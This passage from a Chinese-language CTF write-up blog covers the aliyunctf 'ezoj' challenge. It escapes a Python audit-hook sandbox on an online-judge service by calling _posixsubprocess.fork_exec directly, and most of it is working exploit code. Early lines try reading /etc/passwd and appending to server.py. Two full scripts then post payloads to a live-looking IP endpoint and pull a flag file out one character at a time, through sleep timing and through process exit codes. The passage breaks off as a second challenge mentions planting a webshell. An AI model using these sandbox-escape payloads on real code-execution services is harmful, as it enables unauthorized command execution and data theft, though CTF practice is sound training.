class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>shit man, 刚刚看错了,是not event, 好急: [<a href="https://docs.python.org/3.13/library/audit_events.html]">https://docs.python.org/3.13/library/audit_events.html]</a> 环境是python3版本, 了解一下几个事件</p><ol><li>input() python2存在漏洞, 应该是不行</li><li>现在唯一的问题就是无法exec了,emm</li></ol>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是可以执行了吗? Wrang Answer: pass(0/10)</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小改一下,还是不行,文件没有权限吗,看来只能盲注看看了</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls &gt;&gt; server.py&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls &gt;&gt; static/server.py&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li><li><p>可能的用盲注了,sleep()!没时间写脚本了呜呜</p></li><li><p>还有一种思路是打个内存马</p><ol><li>子进程中设置的任何审计钩子（audit hooks）或类似的机制仅对该子进程有效，并不会影响到父进程x</li><li>子进程无法直接访问父进程中的资源或状态，包括 Flask 应用的状态、变量或上下文 –&gt; 栈帧逃逸?手段有点多了(subprocess不确定(ai说是在操作系统级别启动了一个新的执行环境,不行),综上还是试试盲注)</li></ol></li></ol><h3 id="ezoj-复现"><a href="#ezoj-复现" class="headerlink" title="ezoj | 复现"></a>ezoj | 复现</h3><h4 id="法一-python盲注"><a href="#法一-python盲注" class="headerlink" title="法一: python盲注"></a>法一: python盲注</h4><ol><li><p>这里并不是使用时间盲注而通过返回码进行注入，但是时间盲注也可以，本质是一样的</p><ol start="2"><li>ai的时候卡在了读取输出，这里看一下文档，nb没有文档，看一下源码[<a href="https://github.com/google/python-subprocess32/blob/main/_posixsubprocess.c]%EF%BC%8C**%E8%BF%99%E9%87%8Cpython%E6%96%87%E4%BB%B6%E6%B2%A1%E6%9C%89%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%A6%81%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%BA%90%E7%A0%81">https://github.com/google/python-subprocess32/blob/main/_posixsubprocess.c]，**这里python文件没有实现，要看一下源码</a>**</li><li>[<a href="https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec]%E4%B8%AD%E4%B9%9F%E6%9C%89read%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E8%AF%95%E4%B8%80%E4%B8%8B">https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec]中也有read的内容，试一下</a></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码搜fork_exec(，有注释看一下，但是没有用</span></span><br><span class="line"><span class="string">&quot;fork_exec(args, executable_list, close_fds, cwd, env,\n\</span></span><br><span class="line"><span class="string">          p2cread, p2cwrite, c2pread, c2pwrite,\n\</span></span><br><span class="line"><span class="string">          errread, errwrite, errpipe_read, errpipe_write,\n\</span></span><br><span class="line"><span class="string">          restore_signals, call_setsid, preexec_fn)\n\</span></span><br><span class="line"><span class="string">\n\</span></span><br><span class="line"><span class="string">Forks a child process, closes parent file descriptors as appropriate in the\n\</span></span><br><span class="line"><span class="string">child and dups the few that are needed before calling exec() in the child\n\</span></span><br><span class="line"><span class="string">process.\n\</span></span><br><span class="line"><span class="string">\n\</span></span><br><span class="line"><span class="string">The preexec_fn, if supplied, will be called immediately before exec.\n\</span></span><br><span class="line"><span class="string">WARNING: preexec_fn is NOT SAFE if your application uses threads.\n\</span></span><br><span class="line"><span class="string">         It may trigger infrequent, difficult to debug deadlocks.\n\</span></span><br><span class="line"><span class="string">\n\</span></span><br><span class="line"><span class="string">If an error occurs in the child process before the exec, it is\n\</span></span><br><span class="line"><span class="string">serialized and written to the errpipe_write fd per subprocess.py.\n\</span></span><br><span class="line"><span class="string">\n\</span></span><br><span class="line"><span class="string">Returns: the child process&#x27;s PID.\n\</span></span><br><span class="line"><span class="string">\n\</span></span><br><span class="line"><span class="string">Raises: Only on an error in the parent process.\n\</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是官方payload的源码分析，要略读一遍，换我来应该是找不到的</span></span><br><span class="line"><span class="keyword">if</span> (c2pwrite == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_Py_set_inheritable_async_safe(c2pwrite, <span class="number">1</span>, NULL) &lt; <span class="number">0</span>)</span><br><span class="line">        goto error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (c2pwrite != -<span class="number">1</span>)</span><br><span class="line">    POSIX_CALL(dup2(c2pwrite, <span class="number">1</span>));  /* stdout */</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以知道是subprocess中有调用到，看看具体怎么用的，搜fork_exec(</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    <span class="variable language_">self</span>.pid = _fork_exec(</span><br><span class="line">            args, executable_list,</span><br><span class="line">            close_fds, <span class="built_in">tuple</span>(<span class="built_in">sorted</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, fds_to_keep))),</span><br><span class="line">            cwd, env_list,</span><br><span class="line">            p2cread, p2cwrite, c2pread, c2pwrite,</span><br><span class="line">            errread, errwrite,</span><br><span class="line">            errpipe_read, errpipe_write,</span><br><span class="line">            restore_signals, start_new_session,</span><br><span class="line">            process_group, gid, gids, uid, umask,</span><br><span class="line">            preexec_fn, _USE_VFORK)</span><br><span class="line">    <span class="variable language_">self</span>._child_created = <span class="literal">True</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># be sure the FD is closed no matter what</span></span><br><span class="line">    os.close(errpipe_write)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">self</span>._close_pipe_fds(p2cread, p2cwrite,</span><br><span class="line">                     c2pread, c2pwrite,</span><br><span class="line">                     errread, errwrite)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for exec to fail or succeed; possibly raising an</span></span><br><span class="line"><span class="comment"># exception (limited in size)</span></span><br><span class="line">errpipe_data = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    part = os.read(errpipe_read, <span class="number">50000</span>)</span><br><span class="line">    errpipe_data += part</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> part <span class="keyword">or</span> <span class="built_in">len</span>(errpipe_data) &gt; <span class="number">50000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">finlly:</span><br><span class="line"><span class="comment"># be sure the FD is closed no matter what</span></span><br><span class="line">os.close(errpipe_read)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rrpipe_data:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pid, sts = os.waitpid(<span class="variable language_">self</span>.pid, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> pid == <span class="variable language_">self</span>.pid:</span><br><span class="line">        <span class="variable language_">self</span>._handle_exitstatus(sts)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable language_">self</span>.returncode = sys.maxsize</span><br><span class="line"><span class="keyword">except</span> ChildProcessError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    exception_name, hex_errno, err_msg = (</span><br><span class="line">            errpipe_data.split(<span class="string">b&#x27;:&#x27;</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="comment"># The encoding here should match the encoding</span></span><br><span class="line">    <span class="comment"># written in by the subprocess implementations</span></span><br><span class="line">    <span class="comment"># like _posixsubprocess</span></span><br><span class="line">    err_msg = err_msg.decode()</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    exception_name = <span class="string">b&#x27;SubprocessError&#x27;</span></span><br><span class="line">    hex_errno = <span class="string">b&#x27;0&#x27;</span></span><br><span class="line">    err_msg = <span class="string">&#x27;Bad exception data from child: &#123;!r&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                  <span class="built_in">bytes</span>(errpipe_data))</span><br><span class="line">child_exception_type = <span class="built_in">getattr</span>(</span><br><span class="line">        builtins, exception_name.decode(<span class="string">&#x27;ascii&#x27;</span>),</span><br><span class="line">        SubprocessError)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">issubclass</span>(child_exception_type, OSError) <span class="keyword">and</span> hex_errno:</span><br><span class="line">    errno_num = <span class="built_in">int</span>(hex_errno, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> err_msg == <span class="string">&quot;noexec:chdir&quot;</span>:</span><br><span class="line">        err_msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># The error must be from chdir(cwd).</span></span><br><span class="line">        err_filename = cwd</span><br><span class="line">    <span class="keyword">elif</span> err_msg == <span class="string">&quot;noexec&quot;</span>:</span><br><span class="line">        err_msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        err_filename = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        err_filename = orig_executable</span><br><span class="line">    <span class="keyword">if</span> errno_num != <span class="number">0</span>:</span><br><span class="line">        err_msg = os.strerror(errno_num)</span><br><span class="line">    <span class="keyword">if</span> err_filename <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> child_exception_type(errno_num, err_msg, err_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> child_exception_type(errno_num, err_msg)</span><br><span class="line"><span class="keyword">raise</span> child_exception_type(err_msg)</span><br></pre></td></tr></table></figure></li><li><p>最后还是根据[<a href="https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec]%E6%9D%A5%E8%8E%B7%E5%8F%96">https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec]来获取</a></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># poc</span></span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">c2p_read, c2p_write = os.pipe()</span><br><span class="line">err_read, err_write = os.pipe()</span><br><span class="line"></span><br><span class="line">args = [<span class="string">b&quot;/bin/ls&quot;</span>]</span><br><span class="line">_pid = _posixsubprocess.fork_exec(args,</span><br><span class="line">                                  [<span class="string">b&quot;/bin/ls&quot;</span>],   <span class="comment"># 这个也要记得改</span></span><br><span class="line">                                  <span class="literal">True</span>,</span><br><span class="line">                                  (),</span><br><span class="line">                                  <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, c2p_read, c2p_write, -<span class="number">1</span>, -<span class="number">1</span>,</span><br><span class="line">                                  err_read, err_write,</span><br><span class="line">                                  <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br><span class="line">os.close(c2p_write)</span><br><span class="line">output = os.read(c2p_read, <span class="number">1024</span>)</span><br><span class="line">os.close(c2p_read)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(output))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># final payload script: 时间盲注</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">host = <span class="string">&quot;http://121.41.238.106:35649/api/submit&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        if_zero = <span class="literal">False</span></span><br><span class="line">        kc1zs4=j</span><br><span class="line">        <span class="comment"># 这个code要注意缩进，不然也过不了</span></span><br><span class="line">        code=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import _posixsubprocess</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c2p_read, c2p_write = os.pipe()</span></span><br><span class="line"><span class="string">err_read, err_write = os.pipe()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">args = [b&quot;/bin/bash&quot;, b&quot;-c&quot;, b&quot;cat /flag-b3236515-fead-4f4a-b74b-fb33a7438f3e&quot;]</span></span><br><span class="line"><span class="string">_pid = _posixsubprocess.fork_exec(args,</span></span><br><span class="line"><span class="string">                                  [b&quot;/bin/bash&quot;],   # 这个也要记得改</span></span><br><span class="line"><span class="string">                                  True,</span></span><br><span class="line"><span class="string">                                  (),</span></span><br><span class="line"><span class="string">                                  None, None, -1, -1, c2p_read, c2p_write, -1, -1,</span></span><br><span class="line"><span class="string">                                  err_read, err_write,</span></span><br><span class="line"><span class="string">                                  False, False, False, None, None, None, 0, None, False)</span></span><br><span class="line"><span class="string">os.close(c2p_write)</span></span><br><span class="line"><span class="string">output=os.read(c2p_read, 1024)</span></span><br><span class="line"><span class="string">os.close(c2p_read)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if output[<span class="subst">&#123;i&#125;</span>] == <span class="subst">&#123;kc1zs4&#125;</span>:</span></span><br><span class="line"><span class="string">    from time import sleep</span></span><br><span class="line"><span class="string">    sleep(1)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在尝试&quot;</span>,kc1zs4)</span><br><span class="line">            resp = requests.post(host,json=&#123;</span><br><span class="line">                <span class="string">&quot;problem_id&quot;</span>: <span class="string">&quot;0&quot;</span>,  <span class="comment"># 这个不是数字0，卡了我好久</span></span><br><span class="line">                <span class="string">&quot;code&quot;</span>: code</span><br><span class="line">            &#125;,timeout=<span class="number">2</span>, proxies=bp)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> kc1zs4 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> if_zero == <span class="literal">True</span>: </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;输出完毕&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    if_zero = <span class="literal">True</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(kc1zs4))</span><br><span class="line">            res+=<span class="built_in">chr</span>(kc1zs4)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="法二：返回码python盲注"><a href="#法二：返回码python盲注" class="headerlink" title="法二：返回码python盲注"></a>法二：返回码python盲注</h4><ol><li><p>这种方法会比sleep时间盲注快很多，可以通过返回值来带出ascii编码<code>&#123;&quot;message&quot;:&quot;Runtime Error: ret=1&quot;,&quot;status&quot;:&quot;RE&quot;&#125;</code></p></li><li><p>final_res: aliyunctf{a50f42d9-faf6-4cba-8854-18087ff25712}</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">host = <span class="string">&quot;http://121.41.238.106:35649/api/submit&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code_template=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import _posixsubprocess</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c2p_read, c2p_write = os.pipe()</span></span><br><span class="line"><span class="string">err_read, err_write = os.pipe()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">args = [b&quot;/bin/bash&quot;, b&quot;-c&quot;, b&quot;&#123;command&#125;&quot;]</span></span><br><span class="line"><span class="string">_pid = _posixsubprocess.fork_exec(args,</span></span><br><span class="line"><span class="string">                                  [b&quot;/bin/bash&quot;],   # 这个也要记得改</span></span><br><span class="line"><span class="string">                                  True,</span></span><br><span class="line"><span class="string">                                  (),</span></span><br><span class="line"><span class="string">                                  None, None, -1, -1, c2p_read, c2p_write, -1, -1,</span></span><br><span class="line"><span class="string">                                  err_read, err_write,</span></span><br><span class="line"><span class="string">                                  False, False, False, None, None, None, -1, None, False)</span></span><br><span class="line"><span class="string">os.close(c2p_write)</span></span><br><span class="line"><span class="string">output=os.read(c2p_read, 1024)</span></span><br><span class="line"><span class="string">os.close(c2p_read)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">output_len = len(output)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if &#123;i&#125; &lt; output_len:</span></span><br><span class="line"><span class="string">    sys.exit(output[&#123;i&#125;])</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    sys.exit(255)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># command = &quot;ls /&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat /flag-b3236515-fead-4f4a-b74b-fb33a7438f3e&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">254</span>):</span><br><span class="line">    <span class="comment"># 发送报文，这里code和code_template重名会出错，导致在第一次后就固定无法替换了</span></span><br><span class="line">    code = code_template.<span class="built_in">format</span>(command=command, i=i)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;problem_id&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;code&quot;</span>: code</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(host, json=data, proxies=bp, timeout=<span class="number">2</span>)</span><br><span class="line">    r_data = r.json()</span><br><span class="line">    <span class="keyword">assert</span>(r_data[<span class="string">&quot;status&quot;</span>] == <span class="string">&quot;RE&quot;</span>)    <span class="comment"># 判断是否错误，需要人工纠错</span></span><br><span class="line"></span><br><span class="line">    r_ret_loc = r_data[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;ret=&quot;</span>)</span><br><span class="line">    r_ret = r_data[<span class="string">&quot;message&quot;</span>][r_ret_loc+<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">if</span> r_ret == <span class="string">&quot;255&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(r_ret))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;final_res: &quot;</span>+res)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="法三-返回码bash盲注"><a href="#法三-返回码bash盲注" class="headerlink" title="法三: 返回码bash盲注"></a>法三: 返回码bash盲注</h4><h3 id="ezoj-总结"><a href="#ezoj-总结" class="headerlink" title="ezoj | 总结"></a>ezoj | 总结</h3><ol><li>ai不出就看<strong>文档&#x2F;搜索&#x2F;源码&#x2F;查找原有程序中的应用&#x2F;ai解读</strong><ol><li>比如读取输出来进行盲注的问题，可以看subprocess中对_posixsubprocess.fork_exec()的调用</li><li>[<a href="https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec#example5]%E8%BF%99%E9%87%8C%E4%B9%9F%E6%9C%89">https://www.programcreek.com/python/example/118707/_posixsubprocess.fork_exec#example5]这里也有</a></li></ol></li><li><strong>函数参数列表的解读很重要，可以慢点看(5s换2小时)</strong>: 比如这里的_posixsubprocess.fork_exec()中c2p_read和c2p_write的使用</li><li><strong>版本信息很重要</strong>: tips，这里可以通过sys.version_info来读取到python版本是3.12.9</li><li><strong>盲注角度看返回信息与不同层次</strong><ol><li><strong>多所有返回信息敏感，比较差异，尤其盲注时</strong>: 返回码也是信息，这里可以构造类似于布尔盲注(有返回可控就可以boolean盲注)</li><li>返回可控和有差异也要区分</li><li>返回数字可控可以ascii盲注</li><li>比如如果一直卡在python读取回显可以考虑从bash盲注</li></ol></li></ol><h2 id="打卡-ok"><a href="#打卡-ok" class="headerlink" title="打卡_ok"></a>打卡_ok</h2><h3 id="打卡-ok-OPEN"><a href="#打卡-ok-OPEN" class="headerlink" title="打卡_ok | OPEN"></a>打卡_ok | OPEN</h3><ol><li><p>扫目录，有index.php</p><ol><li>cache.php, error.php</li><li>要先登录，防止跳转</li><li>可能的思路<ol><li>从<code>$check</code>到writec写入木马到缓存文件(不确定)，并且通过后学的文件文件<code>include</code>包含该缓存文件</li></ol></li></ol> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 